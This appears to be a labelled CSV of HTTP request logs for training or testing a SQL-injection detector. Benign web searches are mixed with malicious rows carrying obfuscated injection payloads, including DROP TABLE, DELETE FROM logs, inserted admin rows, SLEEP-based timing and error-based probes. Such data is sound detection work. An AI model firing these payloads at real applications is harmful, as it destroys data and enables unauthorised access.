timestamp,source_ip,method,url,params,body,headers,raw_query,is_malicious,attack_type,insertion_point,mutation_type,orig_payload_id,difficulty_score,source_file,Query,Label,Attack_Type,query_hash
2025-10-06T09:22:36Z,10.168.XXX.XXX,GET,/search,"{""q"": ""best workout plans""}",,,GET /search?q=best workout plans HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,06e22019e1925390b4a0de6e43bf575a
2025-10-24T20:24:51Z,10.112.XXX.XXX,GET,/search,"{""q"": ""best workout plans""}",,,GET /search?q=best workout plans HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,06e22019e1925390b4a0de6e43bf575a
2025-03-06T16:50:13Z,10.60.XXX.XXX,GET,/search,"{""q"": ""best workout plans""}",,,GET /search?q=best workout plans HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,06e22019e1925390b4a0de6e43bf575a
2025-07-30T05:01:33Z,10.23.XXX.XXX,GET,/search,"{""q"": ""Camera""}",,,GET /search?q=Camera HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,4fafee1b542757fa27946b57b4ed8c72
2025-06-15T15:14:40Z,10.40.XXX.XXX,GET,/search,"{""q"": ""Camera""}",,,GET /search?q=Camera HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,4fafee1b542757fa27946b57b4ed8c72
2025-05-30T14:38:15Z,10.205.XXX.XXX,GET,/search,"{""q"": ""Camera""}",,,GET /search?q=Camera HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,4fafee1b542757fa27946b57b4ed8c72
2025-05-22T08:23:57Z,10.52.XXX.XXX,GET,/product,"{""id"": ""best python tutorial"", ""ref"": ""55""}",,,GET /product?id=best python tutorial&ref=55 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,1233464173256052fbd1ec97ac25c28b
2025-03-12T09:19:21Z,10.15.XXX.XXX,GET,/product,"{""id"": ""healthy recipes price"", ""ref"": ""chair""}",,,GET /product?id=healthy recipes price&ref=chair HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,edde80762fd73b40e6354a1facfd561d
2025-04-20T13:04:34Z,10.243.XXX.XXX,POST,/comment,,username=55&comment=55,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=55&comment=55",0.0,,,,,0.0,dataset.csv,,,,df9b8fd26a28706b5eb928151402fa9d
2025-06-28T09:53:28Z,10.175.XXX.XXX,GET,/product,"{""id"": ""1' OR 1=1"", ""ref"": ""12""}",,,GET /product?id=1' OR 1=1&ref=12 HTTP/1.1,1.0,boolean,query_param,base64,p0012,1.0,dataset.csv,,,,c5fb275318f824695679e95038562cde
2025-01-15T12:39:52Z,192.168.XXX.XXX,POST,/api/search,,"{{""user"":""88"",""query"":""'%20OR%201--""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""88"",""query"":""'%20OR%201--""}}",1.0,boolean,body_json,base64,p0171,1.0,dataset.csv,,,,4e1c6f84f7db34bae70bdf0bca1f199d
2025-07-29T18:51:33Z,10.217.XXX.XXX,POST,/api/filter,,"{{""filters"":{{""category"":""books"",""min_price"":687}}}}","{""Content-Type"": ""application/json""}","POST /api/filter HTTP/1.1
Content-Type: application/json

{{""filters"":{{""category"":""books"",""min_price"":687}}}}",0.0,,,,,0.0,dataset.csv,,,,d73438eef7cd7cc3682e1505ce8e7742
2025-02-13T06:54:11Z,10.133.XXX.XXX,POST,/comment,,username=tire review&comment=shelf price,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=tire review&comment=shelf price",0.0,,,,,0.0,dataset.csv,,,,f5d7a4fb2de6b50ca9c03a40a07e2b96
2025-08-24T19:37:40Z,10.238.XXX.XXX,GET,/search,"{""q"": ""best game""}",,,GET /search?q=best game HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,78bda36b4fa5e6fcd81ac44d362e7a7e
2025-10-23T13:54:01Z,10.240.XXX.XXX,GET,/search,"{""q"": ""best game""}",,,GET /search?q=best game HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,78bda36b4fa5e6fcd81ac44d362e7a7e
2025-01-19T00:27:31Z,10.180.XXX.XXX,GET,/search,"{""q"": ""best game""}",,,GET /search?q=best game HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,78bda36b4fa5e6fcd81ac44d362e7a7e
2025-05-06T16:56:48Z,10.147.XXX.XXX,GET,/search,"{""q"": ""24""}",,,GET /search?q=24 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,1b60961ea38a773d86cf4a4a36edf482
2025-07-13T23:19:31Z,10.51.XXX.XXX,GET,/search,"{""q"": ""24""}",,,GET /search?q=24 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,1b60961ea38a773d86cf4a4a36edf482
2025-07-06T12:01:38Z,10.94.XXX.XXX,GET,/search,"{""q"": ""24""}",,,GET /search?q=24 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,1b60961ea38a773d86cf4a4a36edf482
2025-02-16T01:42:22Z,10.99.XXX.XXX,GET,/search,"{""q"": ""65""}",,,GET /search?q=65 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,86d1082d29253392912f2269ff376308
2025-08-19T16:25:59Z,10.251.XXX.XXX,GET,/search,"{""q"": ""65""}",,,GET /search?q=65 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,86d1082d29253392912f2269ff376308
2025-04-03T02:17:41Z,10.203.XXX.XXX,GET,/search,"{""q"": ""65""}",,,GET /search?q=65 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,86d1082d29253392912f2269ff376308
2025-09-28T15:56:20Z,10.197.XXX.XXX,GET,/search,"{""q"": ""'+OR+1=1--""}",,,GET /search?q='+OR+1=1-- HTTP/1.1,1.0,boolean,query_param,base64,p0003,1.0,dataset.csv,,,,ef0b6cadefa9ec27ecdc91baac5a18f4
2025-08-27T17:16:02Z,10.93.XXX.XXX,GET,/search,"{""q"": ""';/**/DROP/**/TABLE/**/users--""}",,,GET /search?q=';/**/DROP/**/TABLE/**/users-- HTTP/1.1,1.0,stacked,query_param,none,p0087,0.3,dataset.csv,,,,06fd9708b086633924fb9681e0cfd9e4
2025-05-29T13:02:35Z,10.170.XXX.XXX,GET,/search,"{""q"": ""';/**/DROP/**/TABLE/**/users--""}",,,GET /search?q=';/**/DROP/**/TABLE/**/users-- HTTP/1.1,1.0,stacked,query_param,none,p0087,0.3,dataset.csv,,,,06fd9708b086633924fb9681e0cfd9e4
2025-05-13T13:11:40Z,10.250.XXX.XXX,GET,/search,"{""q"": ""';/**/DROP/**/TABLE/**/users--""}",,,GET /search?q=';/**/DROP/**/TABLE/**/users-- HTTP/1.1,1.0,stacked,query_param,double_encode,p0087,0.7999999999999999,dataset.csv,,,,06fd9708b086633924fb9681e0cfd9e4
2025-09-13T21:02:35Z,10.85.XXX.XXX,GET,/search,"{""q"": ""best desk""}",,,GET /search?q=best desk HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,66d5dbeea12613e84b1d68528fc05b34
2025-04-02T17:13:02Z,10.241.XXX.XXX,GET,/search,"{""q"": ""best desk""}",,,GET /search?q=best desk HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,66d5dbeea12613e84b1d68528fc05b34
2025-08-11T01:53:49Z,10.232.XXX.XXX,GET,/search,"{""q"": ""best desk""}",,,GET /search?q=best desk HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,66d5dbeea12613e84b1d68528fc05b34
2025-07-14T18:46:03Z,10.43.XXX.XXX,GET,/search,"{""q"": ""python tutorial price""}",,,GET /search?q=python tutorial price HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,d6c7b08453f70ddfd8a3ebbdfa52cfa9
2025-06-17T04:17:09Z,10.43.XXX.XXX,GET,/search,"{""q"": ""python tutorial price""}",,,GET /search?q=python tutorial price HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,d6c7b08453f70ddfd8a3ebbdfa52cfa9
2025-06-22T03:56:52Z,10.175.XXX.XXX,GET,/search,"{""q"": ""python tutorial price""}",,,GET /search?q=python tutorial price HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,d6c7b08453f70ddfd8a3ebbdfa52cfa9
2025-08-21T01:46:07Z,10.185.XXX.XXX,GET,/search,"{""q"": ""%27%20%41%4e%44%20%28%53%65%4c%65%43%74%20%2a%20%46%52%4f%4d%20%28%53%65%4c%65%43%74%28%53%4c%45%45%50%28%35%29%29%29%61%29%2d%2d""}",,,GET /search?q=%27%20%41%4e%44%20%28%53%65%4c%65%43%74%20%2a%20%46%52%4f%4d%20%28%53%65%4c%65%43%74%28%53%4c%45%45%50%28%35%29%29%29%61%29%2d%2d HTTP/1.1,1.0,time-based,query_param,whitespace_obf,p0137,0.7,dataset.csv,,,,8bda7b33b07a9964601f6c21bbb42221
2025-05-22T06:03:36Z,10.163.XXX.XXX,GET,/search,"{""q"": ""%27%20%41%4e%44%20%28%53%65%4c%65%43%74%20%2a%20%46%52%4f%4d%20%28%53%65%4c%65%43%74%28%53%4c%45%45%50%28%35%29%29%29%61%29%2d%2d""}",,,GET /search?q=%27%20%41%4e%44%20%28%53%65%4c%65%43%74%20%2a%20%46%52%4f%4d%20%28%53%65%4c%65%43%74%28%53%4c%45%45%50%28%35%29%29%29%61%29%2d%2d HTTP/1.1,1.0,time-based,query_param,whitespace_obf,p0137,0.7,dataset.csv,,,,8bda7b33b07a9964601f6c21bbb42221
2025-08-17T11:53:31Z,10.197.XXX.XXX,GET,/product,"{""id"": ""flight tickets price"", ""ref"": ""bob""}",,,GET /product?id=flight tickets price&ref=bob HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,ba5575a8048a487e99dee8ade43e8245
2025-08-17T08:19:27Z,10.121.XXX.XXX,POST,/comment,,username=%27+AND+exp%28~%28SELECT+%2A+FROM+%28SELECT+1%29a%29%29--&comment=workout plans price,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=%27+AND+exp%28~%28SELECT+%2A+FROM+%28SELECT+1%29a%29%29--&comment=workout plans price",1.0,error,body_form,none,p0059,0.3,dataset.csv,,,,7f19c01a4095a60c299ece5b1c67d87b
2025-08-26T20:27:45Z,10.15.XXX.XXX,GET,/product,"{""id"": ""62"", ""ref"": ""best workout plans""}",,,GET /product?id=62&ref=best workout plans HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,a516646730edcf6371d7eea1b9432d1e
2025-04-10T22:20:14Z,10.248.XXX.XXX,POST,/api/search,,"{{""user"":""44"",""query"":""Fitness tips""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""44"",""query"":""Fitness tips""}}",0.0,,,,,0.0,dataset.csv,,,,3d745900df89b053e2f44d860b3ead3f
2025-01-06T11:33:48Z,10.52.XXX.XXX,GET,/product,"{""id"": ""%2527%2520AND%2520%2528SeLeCt%2520%252A%2520FROM%2520%2528SeLeCt%2528SLEEP%25285%2529%2529%2529a%2529#"", ""ref"": ""36""}",,,GET /product?id=%2527%2520AND%2520%2528SeLeCt%2520%252A%2520FROM%2520%2528SeLeCt%2528SLEEP%25285%2529%2529%2529a%2529#&ref=36 HTTP/1.1,1.0,time-based,query_param,case_obf,p0137,0.7,dataset.csv,,,,037aea1b7e3fa76c488548b0f373aca2
2025-09-23T04:09:20Z,10.3.XXX.XXX,GET,/item,"{""id"": ""Movie""}",,,GET /item?id=Movie HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,8b6da8f4de29cca786d0616bd9f2ea44
2025-02-15T18:31:16Z,10.238.XXX.XXX,GET,/item,"{""id"": ""Movie""}",,,GET /item?id=Movie HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,8b6da8f4de29cca786d0616bd9f2ea44
2025-05-03T17:05:44Z,10.170.XXX.XXX,GET,/search,"{""q"": ""66""}",,,GET /search?q=66 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,921df30c506d9527eaf6e30fce67ac5a
2025-09-20T08:43:35Z,10.234.XXX.XXX,GET,/search,"{""q"": ""66""}",,,GET /search?q=66 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,921df30c506d9527eaf6e30fce67ac5a
2025-05-31T20:12:55Z,10.192.XXX.XXX,GET,/search,"{""q"": ""66""}",,,GET /search?q=66 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,921df30c506d9527eaf6e30fce67ac5a
2025-05-30T20:10:28Z,10.71.XXX.XXX,GET,/search,"{""q"": ""52""}",,,GET /search?q=52 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,cecd4e7bd6cc2ae8c7187e34cd52d65d
2025-06-07T12:15:18Z,10.197.XXX.XXX,GET,/search,"{""q"": ""52""}",,,GET /search?q=52 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,cecd4e7bd6cc2ae8c7187e34cd52d65d
2025-04-08T13:41:25Z,10.22.XXX.XXX,GET,/search,"{""q"": ""52""}",,,GET /search?q=52 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,cecd4e7bd6cc2ae8c7187e34cd52d65d
2025-05-21T14:11:25Z,10.194.XXX.XXX,GET,/item,"{""id"": ""15""}",,,GET /item?id=15 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,482e28482111e56df7015403650688fb
2025-07-21T12:33:30Z,10.37.XXX.XXX,GET,/item,"{""id"": ""15""}",,,GET /item?id=15 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,482e28482111e56df7015403650688fb
2025-07-02T13:48:29Z,10.74.XXX.XXX,GET,/item,"{""id"": ""15""}",,,GET /item?id=15 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,482e28482111e56df7015403650688fb
2025-07-14T07:37:47Z,10.122.XXX.XXX,GET,/item,"{""id"": ""jacket 2025""}",,,GET /item?id=jacket 2025 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,e719083ebcb094154a9da93f9553b49d
2025-07-30T03:29:32Z,10.190.XXX.XXX,GET,/item,"{""id"": ""jacket 2025""}",,,GET /item?id=jacket 2025 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,e719083ebcb094154a9da93f9553b49d
2025-01-27T12:55:35Z,10.4.XXX.XXX,GET,/item,"{""id"": ""jacket 2025""}",,,GET /item?id=jacket 2025 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,e719083ebcb094154a9da93f9553b49d
2025-03-04T13:09:43Z,10.43.XXX.XXX,POST,/api/search,,"{{""user"":""28"",""query"":""watch""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""28"",""query"":""watch""}}",0.0,,,,,0.0,dataset.csv,,,,1f7be9d3822f2b0ba0bdfdd9798f88de
2025-01-30T22:02:52Z,10.197.XXX.XXX,POST,/comment,,username=camera price&comment=%252527%25253B%252520INSERT%252520INTO%252520users%252520VALUES%252528%252527hacker%252527%25252C%252527pass%252527%252529--%2500,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=camera price&comment=%252527%25253B%252520INSERT%252520INTO%252520users%252520VALUES%252528%252527hacker%252527%25252C%252527pass%252527%252529--%2500",1.0,stacked,body_form,whitespace_obf,p0089,0.8,dataset.csv,,,,e0ca404e6723c5ab2e04f43b40c80a2b
2025-10-10T06:28:59Z,10.182.XXX.XXX,GET,/search,"{""q"": ""javascript guide price""}",,,GET /search?q=javascript guide price HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,a7d3450223da57dc68230acbdd6e384e
2025-06-05T11:41:58Z,10.215.XXX.XXX,GET,/search,"{""q"": ""javascript guide price""}",,,GET /search?q=javascript guide price HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,a7d3450223da57dc68230acbdd6e384e
2025-08-16T10:32:38Z,10.223.XXX.XXX,GET,/search,"{""q"": ""javascript guide price""}",,,GET /search?q=javascript guide price HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,a7d3450223da57dc68230acbdd6e384e
2025-08-13T16:55:48Z,10.115.XXX.XXX,GET,/search,"{""q"": ""hotel booking""}",,,GET /search?q=hotel booking HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,5e4cfb3f3b7b74ff46a2937bec3e883e
2025-04-29T00:37:30Z,10.35.XXX.XXX,GET,/search,"{""q"": ""hotel booking""}",,,GET /search?q=hotel booking HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,5e4cfb3f3b7b74ff46a2937bec3e883e
2025-10-22T08:35:51Z,10.220.XXX.XXX,GET,/search,"{""q"": ""hotel booking""}",,,GET /search?q=hotel booking HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,5e4cfb3f3b7b74ff46a2937bec3e883e
2025-02-08T14:00:46Z,10.197.XXX.XXX,GET,/product,"{""id"": ""65"", ""ref"": ""'\tOR\t1=1\tAND\trow(1,1)>(SeLeCt\tCOUNT(*),CONCAT(CHAR(58),CHAR(58),FLOOR(RAND(0)*2))x\tFROM\tINFORMATION_SCHEMA.PLUGINS\tGROUP\tBY\tx\tLIMIT\t1)#""}",,,"GET /product?id=65&ref='	OR	1=1	AND	row(1,1)>(SeLeCt	COUNT(*),CONCAT(CHAR(58),CHAR(58),FLOOR(RAND(0)*2))x	FROM	INFORMATION_SCHEMA.PLUGINS	GROUP	BY	x	LIMIT	1)# HTTP/1.1",1.0,error,query_param,hex,p0154,1.0,dataset.csv,,,,04cc7d5e314204eec0b57cc59430ccfe
2025-01-11T08:45:51Z,10.60.XXX.XXX,GET,/search,"{""q"": ""';\tDELETE\tFROM\tlogs--""}",,,GET /search?q=';	DELETE	FROM	logs-- HTTP/1.1,1.0,stacked,query_param,url_encode,p0096,0.4,dataset.csv,,,,e72257b1d174a4a4829bd6ca375d688a
2025-01-27T11:35:15Z,10.99.XXX.XXX,GET,/search,"{""q"": ""workout plans 2025""}",,,GET /search?q=workout plans 2025 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,ea581b286c775af7fb248f69879d8d78
2025-01-05T10:27:29Z,10.210.XXX.XXX,GET,/search,"{""q"": ""workout plans 2025""}",,,GET /search?q=workout plans 2025 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,ea581b286c775af7fb248f69879d8d78
2025-10-25T13:36:37Z,10.234.XXX.XXX,GET,/search,"{""q"": ""workout plans 2025""}",,,GET /search?q=workout plans 2025 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,ea581b286c775af7fb248f69879d8d78
2025-06-15T08:21:35Z,10.232.XXX.XXX,POST,/comment,,username=shelf 2025&comment=best hat,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=shelf 2025&comment=best hat",0.0,,,,,0.0,dataset.csv,,,,a7d6154a116e1c4256b4d7234d548635
2025-01-05T12:53:07Z,10.66.XXX.XXX,GET,/search,"{""q"": ""'%20Or%20(SeLeCt%20COUNT(*)%20FROM%20generate_series(1,5000000))>0--""}",,,"GET /search?q='%20Or%20(SeLeCt%20COUNT(*)%20FROM%20generate_series(1,5000000))>0-- HTTP/1.1",1.0,time-based,query_param,base64,p0085,1.0,dataset.csv,,,,a817a07acb09327157346d60801a9a59
